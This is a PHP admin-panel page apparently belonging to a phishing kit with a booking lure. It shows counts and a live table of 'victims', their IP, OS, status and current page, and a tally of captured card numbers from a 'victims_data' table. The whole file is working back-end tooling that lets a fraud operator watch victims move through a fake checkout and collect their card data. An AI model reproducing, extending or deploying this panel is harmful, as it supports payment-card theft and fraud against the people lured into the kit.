<?php

include '../../include/global.php';

if(!session()) redirect('../');

?>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title><?=site('name');?></title>

  <!-- Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
  <!-- End fonts -->

	<!-- core:css -->
	<link rel="stylesheet" href="../assets/vendors/core/core.css">
	<!-- endinject -->

	<!-- Plugin css for this page -->
	<link rel="stylesheet" href="../assets/vendors/flatpickr/flatpickr.min.css">
	<!-- End plugin css for this page -->

	<!-- inject:css -->
	<link rel="stylesheet" href="../assets/fonts/feather-font/css/iconfont.css">
	<link rel="stylesheet" href="../assets/vendors/flag-icon-css/css/flag-icon.min.css">
	<!-- endinject -->

  <!-- Layout styles -->  
	<link rel="stylesheet" href="../assets/css/demo2/style.min.css">
  <!-- End layout styles -->

  <link rel="shortcut icon" href="../assets/images/favicon.png" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>
<body>
	<div class="main-wrapper">

		<!-- partial:partials/_sidebar.html -->
		<?=load('panel/sidebar');?>
		<!-- partial -->
	
		<div class="page-wrapper">
					
      <?=load('panel/header');?>

			<div class="page-content">

        <div class="d-flex justify-content-between align-items-center flex-wrap grid-margin">
          <div>
            <h4 class="mb-3 mb-md-0" style="color: #000">Welcome to Admin Panel - <?=site('name')?></h4>
          </div>
        </div>

        <style>
         .flash-notification {
            animation: flash 3s infinite;
          }

          @keyframes flash {
            0% {
              background-color: rgba(128, 128, 128, 0.2);
            }
            50% {
              background-color: rgba(128, 128, 128, 1);
            }
            100% {
              background-color: rgba(128, 128, 128, 0.2);
            }
          }
          </style>

        <div class="row">
          <div class="col-12 col-xl-12 stretch-card">
            <div class="row flex-grow-1">
              <div class="col-md-3 grid-margin stretch-card">
                <div class="card" style="border-radius: 18px;">
                  <div class="card-body">
                    <div class="d-flex justify-content-between align-items-baseline">
                      <h6 class="card-title mb-0">Guests</h6>
                    </div>
                    <div class="row">
                      <div class="col-6 col-md-12 col-xl-5">
                        <h3 class="mb-2"><?=countable(fetch("SELECT * FROM victims"))?> Guest(s)</h3>
                        <div class="d-flex align-items-baseline">
                          <p class="text-success">
                            <span>+0.<?=countable(fetch("SELECT * FROM victims"))?>%</span>
                            <i data-feather="arrow-up" class="icon-sm mb-1"></i>
                          </p>
                        </div>
                      </div>
                      <div class="col-6 col-md-12 col-xl-7">
                        <div id="customersChart" class="mt-md-3 mt-xl-0"></div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-md-3 grid-margin stretch-card">
                <div class="card" style="border-radius: 18px;">
                  <div class="card-body">
                    <div class="d-flex justify-content-between align-items-baseline">
                      <h6 class="card-title mb-0">Online Guests</h6>
                    </div>
                    <div class="row">
                      <div class="col-6 col-md-12 col-xl-5">
                        <h3 class="mb-2"><?=countable(fetch("SELECT * FROM victims WHERE status = 'online'"))?></h3>
                        <div class="d-flex align-items-baseline">
                          <p class="text-success">
                            <span>+0.<?=countable(fetch("SELECT * FROM victims WHERE status = 'online'"))?>%</span>
                            <i data-feather="arrow-up" class="icon-sm mb-1"></i>
                          </p>
                        </div>
                      </div>
                      <div class="col-6 col-md-12 col-xl-7">
                        <div id="ordersChart" class="mt-md-3 mt-xl-0"></div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-md-2 grid-margin stretch-card">
                <div class="card" style="border-radius: 18px;">
                  <div class="card-body">
                    <div class="d-flex justify-content-between align-items-baseline">
                      <h6 class="card-title mb-0">Awaiting Guests</h6>
                    </div>
                    <div class="row">
                      <div class="col-6 col-md-12 col-xl-5">
                        <h3 class="mb-2"><?=countable(fetch("SELECT * FROM victims WHERE current_page = 'loading' OR current_page = 'loader'"))?></h3>
                        <div class="d-flex align-items-baseline">
                          <p class="text-success">
                            <span>+0.<?=countable(fetch("SELECT * FROM victims WHERE current_page = 'loading' OR current_page = 'loader'"))?>%</span>
                            <i data-feather="arrow-up" class="icon-sm mb-1"></i>
                          </p>
                        </div>
                      </div>
                      <div class="col-6 col-md-12 col-xl-7">
                        <div id="ordersChart" class="mt-md-3 mt-xl-0"></div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-md-2 grid-margin stretch-card">
                <div class="card" style="border-radius: 18px;">
                  <div class="card-body">
                    <div class="d-flex justify-content-between align-items-baseline">
                      <h6 class="card-title mb-0">Guests Cards</h6>
                    </div>
                    <div class="row">
                      <div class="col-6 col-md-12 col-xl-5">
                        <h3 class="mb-2"><?=countable(fetch("SELECT ccnumber FROM victims_data"))?></h3>
                        <div class="d-flex align-items-baseline">
                          <p class="text-success">
                            <span>+0.<?=countable(fetch("SELECT ccnumber FROM victims_data"))?>%</span>
                            <i data-feather="arrow-up" class="icon-sm mb-1"></i>
                          </p>
                        </div>
                      </div>
                      <div class="col-6 col-md-12 col-xl-7">
                        <div id="ordersChart" class="mt-md-3 mt-xl-0"></div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-md-2 grid-margin stretch-card">
                <div class="card" style="border-radius: 18px;">
                  <div class="card-body">
                    <div class="d-flex justify-content-between align-items-baseline">
                      <h6 class="card-title mb-0">Booking Completed</h6>
                    </div>
                    <div class="row">
                      <div class="col-6 col-md-12 col-xl-5">
                        <h3 class="mb-2"><?=countable(fetch("SELECT * FROM victims WHERE current_page = 'invoice_done'"))?></h3>
                        <div class="d-flex align-items-baseline">
                          <p class="text-success">
                            <span>+0.<?=countable(fetch("SELECT * FROM victims WHERE current_page = 'invoice_done'"))?>%</span>
                            <i data-feather="arrow-up" class="icon-sm mb-1"></i>
                          </p>
                        </div>
                      </div>
                      <div class="col-6 col-md-12 col-xl-7">
                        <div id="growthChart" class="mt-md-3 mt-xl-0"></div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div> <!-- row -->
        <div class="row">
          <div class="col-lg-12 col-xl-12 stretch-card">
            <div class="card">
              <div class="card-body">
                <div class="d-flex justify-content-between align-items-baseline mb-2">
                  <h6 class="card-title mb-0">Guests</h6>
                </div>
                <div class="table-responsive">
                  <table class="table table-hover mb-0">
                    <thead>
                      <tr>
                        <th class="pt-0">#</th>
                        <th class="pt-0">Status</th>
                        <th class="pt-0">IP</th>
                        <th class="pt-0">OS</th>
                        <th class="pt-0">Page</th>
                        <th class="pt-0">Created At</th>
                        <th class="pt-0">Action</th>
                      </tr>
                    </thead>
                    <tbody id="victimTableBody">
                    
                    </tbody>
                  </table>
                </div>
              </div> 
            </div>
          </div>
        </div> <!-- row -->

			</div>

      <?=load('panel/footer');?>
		
		</div>
	</div>

	<!-- core:js -->
	<script src="../assets/vendors/core/core.js"></script>
	<!-- endinject -->

	<!-- Plugin js for this page -->
  <script src="../assets/vendors/flatpickr/flatpickr.min.js"></script>
  <script src="../assets/vendors/apexcharts/apexcharts.min.js"></script>
	<!-- End plugin js for this page -->

	<!-- inject:js -->
	<script src="../assets/vendors/feather-icons/feather.min.js"></script>
	<script src="../assets/js/template.js"></script>
	<!-- endinject -->

	<!-- Custom js for this page -->
  <script src="../assets/js/dashboard-dark.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
	<!-- End custom js for this page -->

  <script>

    updateVictims();

    function updateVictims() {
      $.ajax({
        url: '../../api/victims',
        method: 'GET',
        data: {
          limit: 10, 
          page: 'victims'
        },
        success: function(response) {
              $('#victimTableBody').html(response);
              var tables = $(response).find('#victimTableBody'); // Find all tables in the response
                var tableCount = tables.length; // Count the number of tables found

        },
        error: function(xhr, status, error) {
          console.error(error);
        }
      });
    }

    // Periodically update victims every 5 seconds. (Modify this if you want to change the interval)
    setInterval(updateVictims, 5000);

    var colors = {
      primary        : "#6571ff",
      secondary      : "#7987a1",
      success        : "#05a34a",
      info           : "#66d1d1",
      warning        : "#fbbc06",
      danger         : "#ff3366",
      light          : "#e9ecef",
      dark           : "#060c17",
      muted          : "#7987a1",
      gridBorder     : "rgba(77, 138, 240, .15)",
      bodyColor      : "#b8c3d9",
      cardBg         : "#0c1427"
    }

    <?php
    // Get the current year
    $currentYear = date('Y');

    // Generate the revenue chart categories dynamically for all months of the current year
    $revenueChartCategories = [];
    for ($month = 1; $month <= 12; $month++) {
      $monthAbbreviation = date('M', strtotime($currentYear . '-' . $month . '-01'));
      $revenueChartCategories[] = $monthAbbreviation;
    }

    // Pass the revenue chart categories to JavaScript using JSON
    $revenueChartCategoriesJson = json_encode($revenueChartCategories);
    ?>

    var revenueChartData = [
      <?php
      $month_counts = array();

      for ($month = 1; $month <= 12; $month++) {
          $query = "SELECT COUNT(*) AS count FROM victims WHERE MONTH(created_at) = $month";
          $row = fetch_data($query);
          $count = $row['count'];

          $month_counts[$month] = $count;
      }

      for ($month = 1; $month <= 12; $month++) {
          echo $month_counts[$month] . ", ";
      }
      ?>
    ];

    var revenueChartCategories = [
      "Jan 01 <?=date('Y')?>", "Jan 02 <?=date('Y')?>", "jan 03 <?=date('Y')?>", "Jan 04 <?=date('Y')?>", "Jan 05 <?=date('Y')?>", "Jan 06 <?=date('Y')?>", "Jan 07 <?=date('Y')?>", "Jan 08 <?=date('Y')?>", "Jan 09 <?=date('Y')?>", "Jan 10 <?=date('Y')?>", "Jan 11 <?=date('Y')?>", "Jan 12 <?=date('Y')?>", "Jan 13 <?=date('Y')?>", "Jan 14 <?=date('Y')?>", "Jan 15 <?=date('Y')?>", "Jan 16 <?=date('Y')?>", "Jan 17 <?=date('Y')?>", "Jan 18 <?=date('Y')?>", "Jan 19 <?=date('Y')?>", "Jan 20 <?=date('Y')?>","Jan 21 <?=date('Y')?>", "Jan 22 <?=date('Y')?>", "Jan 23 <?=date('Y')?>", "Jan 24 <?=date('Y')?>", "Jan 25 <?=date('Y')?>", "Jan 26 <?=date('Y')?>", "Jan 27 <?=date('Y')?>", "Jan 28 <?=date('Y')?>", "Jan 29 <?=date('Y')?>", "Jan 30 <?=date('Y')?>", "Jan 31 <?=date('Y')?>",
      "Feb 01 <?=date('Y')?>", "Feb 02 <?=date('Y')?>", "Feb 03 <?=date('Y')?>", "Feb 04 <?=date('Y')?>", "Feb 05 <?=date('Y')?>", "Feb 06 <?=date('Y')?>", "Feb 07 <?=date('Y')?>", "Feb 08 <?=date('Y')?>", "Feb 09 <?=date('Y')?>", "Feb 10 <?=date('Y')?>", "Feb 11 <?=date('Y')?>", "Feb 12 <?=date('Y')?>", "Feb 13 <?=date('Y')?>", "Feb 14 <?=date('Y')?>", "Feb 15 <?=date('Y')?>", "Feb 16 <?=date('Y')?>", "Feb 17 <?=date('Y')?>", "Feb 18 <?=date('Y')?>", "Feb 19 <?=date('Y')?>", "Feb 20 <?=date('Y')?>","Feb 21 <?=date('Y')?>", "Feb 22 <?=date('Y')?>", "Feb 23 <?=date('Y')?>", "Feb 24 <?=date('Y')?>", "Feb 25 <?=date('Y')?>", "Feb 26 <?=date('Y')?>", "Feb 27 <?=date('Y')?>", "Feb 28 <?=date('Y')?>",
      "Mar 01 <?=date('Y')?>", "Mar 02 <?=date('Y')?>", "Mar 03 <?=date('Y')?>", "Mar 04 <?=date('Y')?>", "Mar 05 <?=date('Y')?>", "Mar 06 <?=date('Y')?>", "Mar 07 <?=date('Y')?>", "Mar 08 <?=date('Y')?>", "Mar 09 <?=date('Y')?>", "Mar 10 <?=date('Y')?>", "Mar 11 <?=date('Y')?>", "Mar 12 <?=date('Y')?>", "Mar 13 <?=date('Y')?>", "Mar 14 <?=date('Y')?>", "Mar 15 <?=date('Y')?>", "Mar 16 <?=date('Y')?>", "Mar 17 <?=date('Y')?>", "Mar 18 <?=date('Y')?>", "Mar 19 <?=date('Y')?>", "Mar 20 <?=date('Y')?>","Mar 21 <?=date('Y')?>", "Mar 22 <?=date('Y')?>", "Mar 23 <?=date('Y')?>", "Mar 24 <?=date('Y')?>", "Mar 25 <?=date('Y')?>", "Mar 26 <?=date('Y')?>", "Mar 27 <?=date('Y')?>", "Mar 28 <?=date('Y')?>", "Mar 29 <?=date('Y')?>", "Mar 30 <?=date('Y')?>", "Mar 31 <?=date('Y')?>",
      "Apr 01 <?=date('Y')?>", "Apr 02 <?=date('Y')?>", "Apr 03 <?=date('Y')?>", "Apr 04 <?=date('Y')?>", "Apr 05 <?=date('Y')?>", "Apr 06 <?=date('Y')?>", "Apr 07 <?=date('Y')?>", "Apr 08 <?=date('Y')?>", "Apr 09 <?=date('Y')?>", "Apr 10 <?=date('Y')?>", "Apr 11 <?=date('Y')?>", "Apr 12 <?=date('Y')?>", "Apr 13 <?=date('Y')?>", "Apr 14 <?=date('Y')?>", "Apr 15 <?=date('Y')?>", "Apr 16 <?=date('Y')?>", "Apr 17 <?=date('Y')?>", "Apr 18 <?=date('Y')?>", "Apr 19 <?=date('Y')?>", "Apr 20 <?=date('Y')?>","Apr 21 <?=date('Y')?>", "Apr 22 <?=date('Y')?>", "Apr 23 <?=date('Y')?>", "Apr 24 <?=date('Y')?>", "Apr 25 <?=date('Y')?>", "Apr 26 <?=date('Y')?>", "Apr 27 <?=date('Y')?>", "Apr 28 <?=date('Y')?>", "Apr 29 <?=date('Y')?>", "Apr 30 <?=date('Y')?>",
      "May 01 <?=date('Y')?>", "May 02 <?=date('Y')?>", "May 03 <?=date('Y')?>", "May 04 <?=date('Y')?>", "May 05 <?=date('Y')?>", "May 06 <?=date('Y')?>", "May 07 <?=date('Y')?>", "May 08 <?=date('Y')?>", "May 09 <?=date('Y')?>", "May 10 <?=date('Y')?>", "May 11 <?=date('Y')?>", "May 12 <?=date('Y')?>", "May 13 <?=date('Y')?>", "May 14 <?=date('Y')?>", "May 15 <?=date('Y')?>", "May 16 <?=date('Y')?>", "May 17 <?=date('Y')?>", "May 18 <?=date('Y')?>", "May 19 <?=date('Y')?>", "May 20 <?=date('Y')?>","May 21 <?=date('Y')?>", "May 22 <?=date('Y')?>", "May 23 <?=date('Y')?>", "May 24 <?=date('Y')?>", "May 25 <?=date('Y')?>", "May 26 <?=date('Y')?>", "May 27 <?=date('Y')?>", "May 28 <?=date('Y')?>", "May 29 <?=date('Y')?>", "May 30 <?=date('Y')?>",
    ]
    

    var lineChartOptions = {
      chart: {
        type: "line",
        height: '400',
        parentHeightOffset: 0,
        foreColor: colors.bodyColor,
        background: colors.cardBg,
        toolbar: {
          show: false
        },
      },
      theme: {
        mode: 'light'
      },
      tooltip: {
        theme: 'light'
      },
      colors: [colors.primary, colors.danger, colors.warning],
      grid: {
        padding: {
          bottom: -4,
        },
        borderColor: colors.gridBorder,
        xaxis: {
          lines: {
            show: true
          }
        }
      },
      series: [
        {
          name: "Victim",
          data: revenueChartData
        },
      ],
      xaxis: {
        type: "datetime",
        categories: revenueChartCategories,
        lines: {
          show: true
        },
        axisBorder: {
          color: colors.gridBorder,
        },
        axisTicks: {
          color: colors.gridBorder,
        },
        crosshairs: {
          stroke: {
            color: colors.secondary,
          },
        },
      },
      yaxis: {
        title: {
          text: 'Victim',
          style:{
            size: 9,
            color: colors.muted
          }
        },
        tickAmount: 4,
        tooltip: {
          enabled: true,
          formatter: function(value) {
            return Math.round(value); // Round the value to the nearest whole number
          }
        },
        crosshairs: {
          stroke: {
            color: colors.secondary,
          },
        },
      },
      markers: {
        size: 0,
      },
      stroke: {
        width: 2,
        curve: "straight",
      },
    };
    var apexLineChart = new ApexCharts(document.querySelector("#victimsChart"), lineChartOptions);
    apexLineChart.render();
  </script>

</body>
</html>